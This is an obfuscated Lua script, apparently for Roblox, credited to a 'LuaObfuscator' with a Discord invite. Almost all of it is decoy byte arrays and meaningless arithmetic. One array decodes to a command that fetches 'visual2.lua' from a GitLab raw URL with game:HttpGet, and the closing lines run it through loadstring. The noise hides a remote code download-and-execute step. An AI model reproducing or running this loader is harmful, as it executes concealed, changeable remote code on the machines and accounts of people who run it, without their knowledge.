--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          _____                    ____________________    __                              
         /     \ _______   ____   /   _____/\_   _____/  _/  |_  ______                    
        /  \ /  \\___   \ /  _ \  \_____  \  |    __)_  \   __\/  ___/                    
       /    Y    \/    / (  <_> ) /        \ |        \  |  |  \___ \                     
       \____|__  /_____ \ \____/ /_______  //_______  /  |__| /____  >                    
               \/      \/                \/         \/            \/                     

	Discord: https://discord.gg/VwTM63a38Y
--]]
local llllx={209,90,218,187,153,245,143,243,210,18,233,137,59,190,31,56,168,106,239,206,201,3,9,1,146,249,61,67,46};local llllrw={168,167,242,169,202,182,174,177,249,224,162,228,88,167,151,18,34,112,9,102,198,241,245,224,194,61,66,10,91};local III0Ss={90,238,231,235,109,209,39,237,60,75,50,231,235,18,108,168,169,11,144,201,140,6,179,186,141,176,93,61,178,179,129,207,55,147,0,107,186,119,219,203,38,229,102,121,172,128,108,212};local IIIpF5={151,168,60,11,118,210,67,74,34,62,145,56,150,47,217,232,66,99,46,98,188,91,225,128,87,89,235,46,182,215,193,124,248,213,254,86,24,107,66,95,253,242,44,8,24,35,13};local IIa={79,84,70,46,120,197,207,127,215,226,86,148,33,251,174,151,131,126,163,40,30,199,227,188,169,178,100,83,224};local IITs={188,182,32,106,189,129,23,27,24,245,195,72,104,12,23,197,184,122,34,170,70,215,236,132,49,22,195,70,19,101,238,201};local IIIT={204,169,229,127,191,109,81,241,188,88,97,230,169,166,115,132,118,51,150,188};local llll1={117,232,110,165,78,146,34,98,205,158,64,30,195,24,240,75,148,36,50,164,164,68,76,99,95,79,53,223,59,194,213,189,98,70,223};local Izr={66,128,178,156,151,127,46,39,113,246,197,36,69,177,219,108,70,89,132,206,167,143,44,214,239,12,141,198,214,175,113,212,182,131,19,142,190,208,204};local Ih2={206,115,52,64,216,246,43,95,226,52,52,16,169,22,221,78,76,63,69,111,121,241,191,138,123,223,76,127,159,245,108,143,146,151,246,154,139,240,84,244,118};local llllM8Y={174,19,79,120,5,100,85,22,62,18,178,31,126,109,100,125,219,17,105,191,27,8,80,113,240,204,30,227};local lllZl={102,155,111,103,50,170,168,44,134,208,150,0,226,206,60,72,174,81,228,0,182,36,70,169,39,240,234,205,169,47,84,44,108,81,137,195,70,73,10,246,153,134,222,206,78,158,226,218,232};local IIIO5T={67,6,184,49,139,197,157,233,41,177,9,165,128,144,219,228,134,184,113,232,3,64,173,115,18,0,160,153,115,219,18,246,234};local llllXp={140,116,20,235,112,70,196,166,9,174,252,146,130,250,60,87,25,122,154,116,70,27,3,39,168,117,233};local IIrN={88,196,97,68,60,133,146,123,35,185,233,17,14,103,124,83,246,238,71,18,127,65,63,218,19};local lllvj5={254,212,119,252,149,166,126,121,212,52,155,54,241,49,197,129,4,235,60,68,49,65,23,192,13,171,53,170,137};local II6={188,136,73,4,214,131,195,7,196,211,123,224,133,37,91,188,67,129,181,35,65,64,133,101,227,170,141,27,139,158,198,115,41,164,248,149,52};local lllm={164,109,217,110,158,180,90,110,86,194,213,80,231,121,220,220,241,70,27,118,29,103,34,23,64,21,181,85,247,73,136};local lPBw={51,43,25,248,98,220,14,3,213,169,158,127,179,253,204,196,244,58,231,184,53,49,23,67,190,104,192,20,249,112,192,74,137,179,35,225,173,231,12,233,41,250,106,60};local llllGKI={242,36,55,72,73,235,234,173,6,13,214,221,138,150,229,115,244,196,3,148,217,90,34,203,91,62};local llllV={72,218,219,154,243,143,14,237,123,136,242,13,76,12,181,47,71,70,67,34,225,148,143,172,112,126,160,73,14,30,194,96};local Ik9J={67,114,128,191,94,220,65,83,6,236,219,165,64,123,186,244,72,173,153,160,182,185,70,97,232,201,203,63,210,27};local IIIn={4,81,239,112,141,73,247,144,142,162,61,158,44,183,37,178,189,209,179,205,205,194,229,10,205,234,240,118,13,171,3,188,117,44,223,185,114,200,44,128,69,53,197,249,103,179,117,220};local lllTZp={157,28,113,148,134,29,157,200,37,73,97,129,128,176,100,254,208,87,254,143,4,225,67,254,239,95,136,84,174,39};local IIpQe={26,92,81,244,114,211,248,119,141,46,171,151,93,35,70,156,238,179,133,41,59,162,91,196,45,213,113};local lllld={200,83,16,37,69,132,170,40,82,187,58,244,128,181,213,66,55,165,238,126,88,152,179,218,219,88,67,190,244,180,7,8,185,52,134,192,193,90,1,109,241,66,129,122,124};local lllj={167,176,248,243,87,183,130,198,168,141,140,203,52,72,179,78,254,172,138,91,62,147,120,55,232,193,160,56,197,180,23,19,115,64,230,41,182,83,91,245,175,184,205,156,156,253,48};local lllqB={249,129,96,59,101,85,149,202,169,51,249,191,80,94,34,119,109,51,45,253,111,177,141,82,209,165,184,80,141,128,170,195,70,217,176,21,20,189,250,118,218,103,190,205,175,193,117,155};local IYZI={144,184,108,46,120,26,217,118,55,73,21,190,23,85,176,30,202,84,191,195,197,86,118,194,142,254,174,78,21,53,212,60,122,143,180,86,231,142,229,143,11};local IIj0={209,18,37,33,223,127,232,12,154,116,148,211,35,207,97,19,42,45,16,185,44,16,9,242,74,7,30,196,49,113,242,216,199,37,157,29,86,86,62,138};local lllrEl={204,238,15,12,30,210,86,121,30,80,48,240,162,248,74,126,242,213,206,197,30,19,182,2,248,202,198,46,174,237,148,149,205,236,223,55,46};local llllGSU={244,131,243,157,68,8,253,254,225,175,88,172,43,158,165,237,9,213,129,237,81,98,210,54,18,25,117,225,6,99,44,174,2,35,247,111,246,80,251,109,138,221,60,13,12,70,212};local lllM={136,71,86,231,22,173,164,91,70,241,251,52,73,235,254,150,177,196,19,185,11,178,81,49};local IIct7={248,248,195,133,165,196,75,61,202,45,238,99,80,220,81,117,19,223,10,198,127,175,143};local llllYg={158,28,111,118,58,87,147,6,197,45,189,162,139,221,222,57,131,239,49,238};local llllP={16,66,241,70,209,54,81,207,241,175,83,169,99,43,163,155,9,133,63,36,164,181,36,186,230,177,252,13,76,222,52,120,106,20,139,231};local lM={77,107,88,105,168,136,70,16,208,210,154,10,142,235,48,91,155,191,90,192,62,87,22,199};local llx={81,192,236,152,158,78,76,53,158,102,31,162,137,94,245,197,183,80,59,175,185,25,24,39};local IIIN={37,175,164,216,99,155,44,110,177,191,158,112,104,244,174,48,211,134,220,14,172,247,143,240,250,91,122,43,141,46,209,168,76,167,127,186,10,81};local IIm={239,209,233,221,65,182,207,241,131,144,218,247,119,175,254,183,233,31,127,7,251,148,55,191,100,163,212,242,204,190,230,59,116,24,31,208,96,213,180,75,54};local I2r8={89,52,114,127,37,212,243,160,162,74,214,17,50,97,26,127,226,181,47,93,87,64,111,17,65,161,195,12,228,85,132,227,171,155,49,58,254,137,59,160,97,231,119,84,90,159,123,121};local IIIu={197,157,114,253,195,205,48,20,127,193,194,143,84,75,41,105,221,44,184,216,95,205,40,131,111,206,220,9,175,108,216,136,212,2,201,202};local llllwyu={209,179,139,94,173,234,7,50,237,41,217,79,171,227,79,114,138,21,185,60,176,4,127,223,27,168};local llls={188,4,159,155,74,24,90,10,83,200,28,193,63,173,191,254,242,231,180,10,133,107,171,66,205,144,178,30,72,124,164,158,215,212,95,222,245,154,63,202,39,127,41,214};local IIII={229,88,18,181,252,158,110,99,111,93,62,95,62,238,65,146,92,74,33,193,31,169,65,59,58,248,175,206,206,138,120,147,218,211,247,22,214,254,110,112,253,162,137,76,40,55,55};local IIIr2={227,85,221,90,100,73,211,153,74,100,28,68,60,120,254,110,139,195,72,186,235,81,76,149,146};local ll3O={212,216,239,215,236,173,238,154,157,226,179,232,200,248,189,185,30,235,43,51,253,203,179,121};local lE68={127,114,126,210,219,44,109,252,225,213,1,233,63,147,49,147,252,195,175,97,67,68,165,43,195,246,50,112,124,236,220,226,251,87,199,236,243,212,166,113,70};local IDAN={105,132,221,249,133,192,178,69,123,186,77,31,119,194,5,196,63,175,244,70,206,57,193,147,43,186,179,54,54,156,227,144};local lllk3={119,59,252,196,245,214,48,58,161,114,108,22,90,182,161,67,102,102,129,161,108,51};
local lll3zJ=83;local llllTI=lll3zJ+36;local ITW=622;local llnd6=ITW+88;local llsY=176;local llU2S=llsY+68;local IIe=38;local IIoz9=IIe+0;local Ijs=721;local llllU=Ijs+81;local IItV=262;local IIIJHM=IItV+68;local IML=330;local IkOY=IML+57;local llllR=812;local llll4G7=llllR+46;local IA=224;local lRkA=IA+64;local II0=329;local lllTI=II0+40;local IIIY7=246;local llle=IIIY7+36;local IIrK6=685;local IIYq=IIrK6+30;local llC=309;local IIx45=llC+96;local IIIh=298;local IIe8M=IIIh+53;local II0r=106;local llllw=II0r+92;local l8H=703;local llllKdS=l8H+91;local lllQ=168;local lNts=lllQ+72;local IIIu=764;local ISnr=IIIu+87;local lllzX9=354;local llsL=lllzX9+81;local lw=332;local lllWAF=lw+48;local llllh=445;local lZ=llllh+62;local lllln9=126;local lllln7=lllln9+77;local llll1=528;local llll3td=llll1+76;local llEG7=44;local ll3h=llEG7+52;local ISx=860;local llllRq7=ISx+92;local llJ30=186;local IIWr=llJ30+81;local lly=409;local llllQyH=lly+31;local lllld=181;local lk=lllld+51;local IIl=256;local Iip=IIl+48;local IDf=498;local Ib9=IDf+50;local llllK=82;local llPO=llllK+38;local IsM=64;local llllJL=IsM+3;local lG=486;local lmp6=lG+54;local llllQ=313;local llllj=llllQ+75;local IIID=219;local lb=IIID+6;local IIx=601;local III0=IIx+98;local llQd=137;local lle7z=llQd+20;local lllltQ=992;local llllPU=lllltQ+3;local l7=307;local llllI=l7+71;local IIIP=204;local lu73=IIIP+3;local IIIjFo=702;local IWQ=IIIjFo+60;local IP=692;local lle2=IP+71;local llRww=262;local llll43=llRww+76;local llz=213;local IIIU=llz+47;local lllld=87;local IA=lllld+31;local lllWIG=532;local lllLU=lllWIG+81;local IIIJT7=709;local llfjl=IIIJT7+63;local llllKu=842;local IId=llllKu+88;local llllt=396;local ll0JL=llllt+72;local IIiYo=25;local lllu0=IIiYo+56;
local lllD9,lZ=string.char,table.concat;
local llDO={242,23,207,169,140,65,147,36,203,56,41,251,133,98,4,149,31,39,171,195,85,75,248,131,115,8,39,51,89,253,144,103,32,96,229,102,163};local lXMd={88,37,167,189,95,167,27,117,90,19,135,110,56,80,214,108,4,107,60,106,87,56,120,127,43,42,53,106,138,22};local IIVe={164,40,60,42,112,49,106,120,158,119,103,41,164,45,162,26,145,119,10,26};local IISqB={176,97,97,237,0,197,212,171,68,208,222,243,64,98,145,181,172,169,191,44,59,147,54,134,139,6,205,217,69,130};local III4={221,171,98,85,3,46,213,13,41,95,56,100,170,3,211,148,128,174,142,210,192,188,121,19,221,233,196,70,185,181,17,46,151,207,174,154,97,148,128,62,98,211,78,189,37,52,0};local IIPXj={163,133,67,105,178,95,102,33,81,93,21,189,115,47,163,165,188,196,201,195};local IIIulK={137,153,116,87,183,173,246,71,13,19,189,180,235,162,7,62,134,160,144,96,231,106,49,130,123,28,84};local lOp={111,160,43,195,198,253,138,211,147,209,183,81,111,51,166,123,125,190,156,155,10,88,5,139,188,32,254};local IM={176,219,123,6,239,180,51,43,79,235,254,33,221,71,249,253,65,68,93,17,37,81,67,77,146,23,57,168,96,66,135,4};local llmuz={211,166,8,218,94,42,158,250,190,48,137,156,141,167,167,90,227,34,18,147,119,142,0,54,34,238,32,55,55,103,101,215,45,179};local llllzMO={167,179,116,71,84,7,148,18,175,223,200,71,204,245,82,36,173,235,107,3,208,200,120,57,111,50,113,224,2,156,227,27,189,184};local I3GE={91,58,207,206,148,6,127,9,207,182,20,165,94,55,8,89,104,152,120,212,183,48,27,246,49,104,73,209,144,185,194,190,216};local IIKU={108,180,79,42,254,95,58,79,77,25,216,151,252,249,157,165,178,195,120,5,12,167,161,35,23,167,237};local lllLNE={32,91,207,236,55,4,242,169,62,146,47,205,68,168,219,17,222,197,188,48,72,155,231,103,66,230,176,250,20,18,26,205,175,63,223,105,97,116,174,143,163,157,15,214,95,74,176,87,58};local lJ={11,177,237,228,93,93,154,219,223,31,188,112,37,78,51,156,217,191,113,27,75,0};local IAfl={28,190,85,189,22,7,109,31,73,56,62,36,84,145,44,66,50,185,82,2,107,19,31,15,136,57,186,150,140,248,251};local IIIb={79,131,119,193,8,126,76,94,74,26,253,192,44,31,30,151,236,41,239,15,182,69,4,195,52,213,167,6,179,143,223,128,210,101,196,184,76,129,45,62,144,34,227,205,71,249,176,167};local lllw={211,198,98,14,182,78,94,216,193,213,243,92,37,158,132,225,22,35,15,77,63,190,156,166,92,138,48,93,27,142,80,131,235,180,151};local llrJn={75,65,196,229,63,20,77,113,187,91,236,153,110,20,84,161,41,229,44,152,43,30,0,81,146,240,179,155,30,36,136,183,206,85,7,39,89,193};local II4J={202,218,253,88,87,247,84,154,222,179,240,26,146,128,245,34,253,57,64,22,88,65,36,66,67,156,239,202,4,238,110};local llllSSK={136,237,11,122,181,29,36,23,169,117,72,85,47,167,196,91,163,170,40,12,235,71,248,124,182,23,54,135,96,214,200,93,228,195,71,82,123,192,83};local llllIW={155,4,42,11,57,77,214,68,152,94,100,1,75,132,248,173,200,76,183,82,150,108,185};local Ib={234,102,178,78,171,42,126,244,247,137,63,89,229,48,176,55,189,216,69,35,60,243,169,182,102,164,166,207,139,182,186,63,242,16,90,22,106,218,153,173,149,125,183,2};local Iv={141,181,120,125,136,106,169,95,187,100,82,250,229,224,140,64,0,69,10,166,164,139,233};local lha={174,119,153,20,148,193,138,25,89,15,105,93,207,46,254,117,204,252,110,191,66,192,166,218,209,145,0,144,60,146,166,86,123,217,63,171};local I5jm={225,23,200,8,81,211,169,65,161,81,170,200,213,195,70,77,80,197,151,194};local llllKw={53,221,225,64,140,72,201,61,3,97,15,95,28,92,17,28,113,95,90,6,86,60,215,110,182,89,213,243,104,241,222,136,90,160};local IIC={37,65,51,96,240,15,9,137,113,191,78,199,150,8,110,208,254,92,111,228,222,12,16,223,144,31};local Ibvy={229,138,212,68,4,43,82,105,0,128,211,196,149,175,137,253,13,239,89,25,124,226,68,162,63,171,18,131,50,155,230,185,95,9,43,182,102,129,92,170,134,82,140,157,5,240,183,61,124};local llllkM={119,77,182,216,71,30,29,166,157,131,88,193,246,249,214,206,72,42,44,35,76,194,163,244,57,26,2};local IX={243,148,209,47,90,24,150,163,6,137,154,248,27,57,147,208,88,175,130,139,102,142,229,187,206,47,149,203,88};local ll5OP={253,238,224,244,205,197,144,240,115,175,57,235,53,52,249,227,159,203,193,51,241,29,137,151,48,144,35,222,217,168,203,176,92,215,65,161,200,39,81,138,238,22,106,84,142,233,170};local ITf={64,73,69,185,189,78,44,159,254,147,146,250,93,235,115,104,235,69,167,155,249,132,181,69,146,140,51,38,74,113,248,241,176};local lQmN={197,32,152,162,249,77,218,71,150,8,223,26,227,39,233,98,15,97,165,220,96,85,199,79,95,236,178,182,192,233,40,210,152,189,163,12,202,190,127,49,236,231,111,216,130,171};local IIG={47,142,99,92,207,154,180,234,21,24,45,5,120,129,180,148,237,171,116,105,27,85,211,176,8,120,176,120,242,194,69,24,38,233,103,3,74,56};local IIkf={94,246,176,198,88,234,134,213,224,73,242,235,151,103,7,114,230,175,228,186,51,143,204,141,51,33,232,16};local IIIJ7={114,156,43,218,218,70,155,134,24,111,131,45,81,89,29,117,248,61,254,117,31,102,102,231,15,221,176,178,247,205,125,131,89,251,167,126,74,143,153,128,58,44};local llf={110,148,149,156,152,224,204,85,45,201,214,12,5,77,240,69,210,128,66,61,168,60,126,112,166,242,176,192};local llp={95,27,110,57,245,33,5,140,224,65,62,22,18,85,72,84,143,105,29,69,109,183,241,186,96,185,240,76,254,212,83,233,208,38,187,12,170,234,200,102,70,184,238};local IFM={196,168,193,40,66,40,25,35,162,4,102,246,185,95,101,91,191,229,252,130,82,119,42,88,219,228,193,39,179,94,168,103,1,185,23,234,235,119,155,115,236,70};local lFve={224,53,157,39,156,114,174,116,41,90,251,5,134,87,189,19,156,236,198,17,238,204,1,174,7,71,115};local Iy={162,127,80,241,43,177,32,58,129,125,104,39,138,33,83,212,188,95,13,119,28,216,109,172,210};local llRb={77,44,85,137,89,126,248,211,80,176,112,183,129,90,210,2,153,19,119,223,217,153,47,242,232,7,153,167,107,136,51,144,205,81,141,203,253,12,234,249};local IIIxOQ={83,215,101,125,6,196,55,254,83,27,252,251,131,72,117,79,137,138,59,185,54,252,24,33,135,208,165,254,227,182,46,60,42,150,184,51};local llllkfC={44,243,150,44,144,189,173,251,107,75,153,193,218,82,129,120,21,156,101,66,140,68,28,89,200,17,34,145,234};local lllld9z={204,117,74,169,140,224,59,248,176,70,248,220,208,156,74,123,138,42,131,105,242,19,184,84,165,179,11,250,0};local IIIhJ={31,92,233,165,85,57,172,228,72,91,43,41,171,50,104,17,42,192,215,30,10,246,118,189};local IrO={72,127,121,62,246,7,179,102,211,247,23,179,250,143,207,235,58,122,232,247,31,114,211,117,45,177,53,202,84,22,225,185,96,43,171,76,6,51,251};local IB={111,240,97,137,230,89,247,124,148,23,58,209,144,13,102,41,49,89,47,235,32,59,47,184,2,131,88,20,95,157,103,95,62,40,214,151,169,127,232,168,115,50,242};local lllVZ={157,168,87,79,114,25,28,98,19,160,56,146,97,143,221,89,118,53,190,194,170,83,137,148,192,71,208,237,161,61,70,131,60,159,141,22};
local lllliu={108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,112,115,58,47,47,103,105,116,108,97,98,46,99,111,109,47,116,114,97,120,115,99,114,105,112,116,115,115,47,116,114,97,120,115,99,114,105,112,116,115,115,47,45,47,114,97,119,47,109,97,105,110,47,118,105,115,117,97,108,50,46,108,117,97,34,41,41,40,41};
local IIqb=451;local III3=IIqb+63;local IIIC=781;local l4=IIIC+75;local IF=640;local llS=IF+60;local IgP=295;local llll0=IgP+89;local IIg=650;local llllj=IIg+76;local IIIMuw=778;local ll1=IIIMuw+39;local llw5X=961;local IIIoM=llw5X+35;local IIIvX=461;local llllbO=IIIvX+68;local II10=71;local ll8y=II10+39;local lllF=121;local lrep=lllF+17;local lllng=547;local llllD=lllng+91;local lllJ=987;local IIIb=lllJ+99;local llo=326;local IQ=llo+91;local IIIKJ=186;local lla4y=IIIKJ+29;local II9ss=179;local IZy=II9ss+35;local lllmw=884;local IIYt=lllmw+90;local llll6l=212;local IIIt=llll6l+13;local IIIoa=450;local lUa=IIIoa+76;local llTky=302;local InkR=llTky+97;local llll1C0=116;local lQ=llll1C0+8;local llllHa1=154;local IBjo=llllHa1+51;local IPH=878;local IIIvsY=IPH+13;local lll3M=356;local llKId=lll3M+17;local IIId=320;local llGC=IIId+53;local llllJZ4=428;local lL4=llllJZ4+53;local IA=307;local IG7=IA+85;local IIWw=66;local llUo=IIWw+0;local lllc=757;local Iw=lllc+99;local llnI=47;local llllb7=llnI+13;local llldek=599;local lli=llldek+17;local II2=770;local llllCOo=II2+13;local lllTk=486;local lH=lllTk+65;local IxWi=472;local lr=IxWi+20;local IIILUw=299;local llMvv=IIILUw+17;local llllX=792;local IId=llllX+75;local I9mi=863;local II2HR=I9mi+83;local IIILs=420;local lla=IIILs+58;local IImd=195;local llllRE=IImd+64;local IIMf=246;local IIjfJ=IIMf+45;local ll62R=762;local IIIQ=ll62R+0;local I6YN=427;local IIr2S=I6YN+49;local IIsRM=602;local llb=IIsRM+84;local lllp=486;local IIIr=lllp+8;local III7do=51;local IIb=III7do+32;local llE=44;local IIc7O=llE+41;local lllJK=340;local I4P=lllJK+91;local llY=457;local l7F=llY+14;local ll5=556;local IIYG=ll5+64;local lO=184;local IIgw=lO+95;local II1pC=610;local lmxI=II1pC+27;
local llllP={};
for lllH=1,#lllliu do 
llllP[lllH]=lllD9(lllliu[lllH]);
end;
local lllR={59,2,56,25,30,38,102,239,116,68,177,248,17,172,21,194,180,192,68,172,94,251,237,82,214,200,173,145,236,197,236,146};local llllg={81,97,114,214,116,247,128,195,162,89,151,79,119,172,241,194,85,143,37,182,69,42,227,91,254,23,58,117,168,188};local llllRPb={83,198,177,122,109,24,80,86,71,157,46,172,105,154,161,26,92,33,120,211,123,0,14,198,40,208,60,18,212,173,156,194,113,54,22,68,167,157,127,203,47,134,22};local I2iN={154,18,78,106,74,54,183,229,2,36,20,180,38,77,92,210,112,176,87,218,46,72,83,87,245,18,175,247,137,220,104,131,64,51};local lF={246,21,45,84,56,252,48,134,184,160,134,226,115,3,177,132,0,234,90,153,106,99,64,137,5,5,18,38,242,152};local IIIaW={121,99,82,0,247,28,157,9,248,95,69,101,137,209,198,50,201,173,86,124,5,200,30,220,244,41,149,212,59,155,88,121,220,133,17,187,187,117,34,150,22,45,0,171};local llll8Bw={136,128,240,247,145,195,65,10,116,21,19,103,6,48,187,32,73,211,201,130,32};local llllguX={129,59,186,167,204,162,252,48,2,226,132,68,130,155,182,100,165,90,237,170,72,49,235,195};local llQ={80,39,167,95,232,121,45,65,99,209,153,219,120,129,145,165,216,76,133,38,54,50,196,214,125,128,160,230,221,99,82,235,181,38,3,153,22,5,152,67,12,65,44,36,14,101,246,167,62};local lOQy={179,125,252,176,68,92,34,141,177,189,58,180,191,0,30,71,186,38,63,238,9,198,16,97};local II55={239,137,232,213,45,16,41,194,220,165,100,60,182,250,232,85,12,171,166,154,126,22,7,32};local III2gj={254,196,86,8,40,111,178,224,185,136,7,112,211,153,169,181,245,251,55,72,141,190,250,229,193,151,58,187,184,148,239};local IvHF={216,44,94,211,211,48,72,46,107,149,120,235,21,223,11,243,136,164,134,4,192,3,236,177,134,213};local l5Qf={63,202,94,202,72,73,224,22,126,130,43,36,137,42,87,158,249,158,227,130,18,165,195,47,228,39,64,127,189,146,47,7,240,107,155,250,235,168,163,217};local lA={30,98,175,49,67,250,121,35,10,201,172,227,232,55,151,122,75,204,134,132,160,204,114,134,107,68,158,150,61,180,126,219,25,117,219,133};local llllXY={148,237,109,74,130,41,119,185,190,212,181,53,37,183,61,191,179,74,184,22,52};local In={222,104,197,203,157,216,246,70,7,252,73,123,76,158,253,102,72,5,107,78,136,42,56,133,124,170,1,7,42,121,178,10,166,129,36,174,177,128,240,193,50,235,205,115};local lllW={17,166,52,134,209,91,67,123,217,163,36,19,160,206,188,121,154,20,70,81,52,117,104,20,182,38,199,204,235};local llll9UL={101,36,2,160,16,35,148,43,114,119,217,117,198,73,247,117,181,6,82,87,0,76,3,181};local IIIVKt={248,182,189,81,83,136,151,215,66,99,206,226,84,112,15,253,42,39,74,232,225,190,125,182,225,85,6,247};local ll1NA={167,251,33,162,123,74,114,19,122,127,181,52,64,56,1,27,159,31,163,164,75,34,125,1,251,75,150,209,239,185,115,229,170,75,168,175,160};local llaBB={202,7,74,62,50,237,120,170,85,18,109,205,84,254,149,50,184,56,176,120,141,188,164,119,99,198,155,111,212,53,84,242,208,65,175};local llXM={212,19,157,6,126,252,69,53,71,33,118,47,247,17,138,90,219,105,159,150,140,85,61,177,6,63,73,40};local III3iy={34,189,222,250,137,155,55,120,41,130,18,106,79,23,152,161,133,229,176,144,73,1,64,155,213,59,224,94,18,118,251,95,35,212};local ll4={183,10,96,53,128,32,7,206,20,63,228,205,54,73,152,219,154,13,218,219,76,208,246,188};local lllldO={147,18,22,215,22,11,5,50,151,80,235,89,148,220,1,119,45,15,222,36,186,137,59,1,98};local lA={235,28,241,216,135,124,220,184,87,35,58,156,104,117,169,103,38,169,160,17,0,114,240,128,80,165,83,205,250};local lllj={18,153,60,171,27,28,203,216,105,100,201,41,53,168,10,183,177,244,176,11,195,54,169,252,12,224,216,209,133,47,174,84,19,88,206,242,171,49,131};local II1O={66,123,156,2,69,193,205,77,252,100,107,187,106,73,62,98,235,39,97,216,197,254,64,216,159,223,111,34,214,72,30,184};local lluS={52,103,200,4,8,119,228,82,250,230,63,23,140,238,161,186,3,228,87,242,21,215,129,200,171,47,75,123};local llllSk={12,87,217,147,138,172,27,101,154,183,151,183,39,28,111,78,92,147,98,234,254,186,193,154,205,226,178,91,157,140,242,246,166,47,44};local lMnV={69,236,73,103,36,41,149,165,242,217,87,47,246,142,143,187,193,94,248,56,253,189,138,74,221,189,33,157,1,152,66,134,21,70,141,48,190,75,244};local llYB1={208,159,23,220,77,129,63,34,254,31,6,117,185,75,230,248,126,223,89,114,12,135,160,176,221,146,37,160,201,202,142,126,219,110,2,129,201,78};local ll7={54,202,217,209,118,219,74,36,12,203,197,134,244,52,215,188,40,69,120,167,72,191,87,252,129,177,247,249,231,192,103,163,87,161,231,35,207,185,31,4,214,50,7,15,210,57,50,224,248};local lJlM={153,115,67,15,180,215,111,19,250,13,115,141,45,98,38,182,126,178,231,85,244,53,21,220,251,82,10,4,49,12,9,86,31,160,173,121,4,231,142,0,104,52};local llAM={58,15,18,74,59,7,3,100,79,118,188,204,37,251,155,141,77,71,211,180,111,248,141,189,108,149};local llllV={129,177,146,7,61,220,248,186,103,254,167,31,178,80,74,209,41,106,235,0,160,38,174,178,151,146,222,35,214,154,170,201,75,175,220,199,176,19,149,134};local IB={72,109,102,33,124,252,254,3,143,166,202,233,3,249,216,102,253,253,93,141};local lt2={119,181,12,214,165,199,15,19,53,3,93,155,232,136,159,11,110,9,13,0,49,21,123,61,26,188,196,171,125,123,243,187,62,73,164,113,137,135,58,104,173,31,237,107,101};local lllRt={131,195,114,94,93,45,4,15,9,103,118,144,134,72,247,158,124,150,136,37,187,24,251,28,54,246,24};local lk={234,234,20,155,244,12,141,39,234,75,180,25,174,210,145,233,123,223,99,112,127,199,83,208,36,219,24};local IIQH={22,77,48,49,208,124,154,192,28,217,38,147,26,29,85,53,74,136,23,73,133,218,49,176,60,87,249,35,240,116,131,159,219,83,36,76,218,116};local llllXgu={88,221,86,227,4,53,125,220,31,5,232,165,222,165,170,27,178,185,222,92,51,90,173,229,38,100,117,15,32,181,31,136,128,115,143,71,219,230,27,132,29,226,167,60,35,227,145,225};local IIIZKu={28,60,19,228,173,150,225,113,82,73,77,38,111,43,15,120,138,216,224,13,204,45,251,241,172,129,32,148,13,151,215,2,196,163,2,48,26};local llP7o={142,250,66,190,101,121,122,40,64,235,49,192,107,69,57,37,147,224,217,245,18,91,71,4,137,120,23,138,8,220,67,81,252,17,226,61,67,138,35};local lllCj={184,97,168,13,32,156,253,79,35,200,136,94,173,116,156,115,53,55,135,182};local llllba5={188,146,150,83,102,7,163,34,48,107,234,37,125,174,234,216,10,15,240,180,185,156,125,216,246,225,128,206,233,9,25};local llPdg={97,197,8,19,135,25,40,227,202,57,250,164,136,149,25,158,167,96,19,85,250,17,78,141,68,16,37,238,83,221,221,90,95,50,193,111,29,13,68,145,18,118,212,118,75,42};local llllCIB={156,64,93,30,5,95,165,30,109,86,117,9,236,164,99,3,30,141,227,56,211,37,16,96,134,53,86,10,159,182,100,135,77,197,206,123,200,141,113,35,100,150,84,175,208,168,215,148,33};local lsu={215,222,95,92,72,15,89,158,152,54,8,153,103,95,219,91,29,5,158,247,113,185,206,37,27,225,84,194,248,201,171};
local lll7F=lZ(llllP);
(function()return(function()return loadstring(lll7F)()end)()end)()